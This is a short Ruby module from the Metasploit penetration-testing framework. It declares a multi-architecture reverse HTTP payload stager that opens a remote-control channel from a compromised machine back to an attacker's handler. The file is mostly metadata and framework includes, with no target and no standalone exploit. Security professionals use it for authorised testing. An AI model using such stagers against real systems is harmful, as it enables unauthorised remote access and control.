##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/multi/reverse_http'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Multi
  include Msf::Payload::Multi::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse HTTP Stager (Mulitple Architectures)',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => ['win', 'osx', 'python', 'linux', 'android', 'java'],
      'Arch'        => [ARCH_X64, ARCH_X86, ARCH_JAVA, ARCH_PYTHON, ARCH_DALVIK],
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'http'))
  end

end
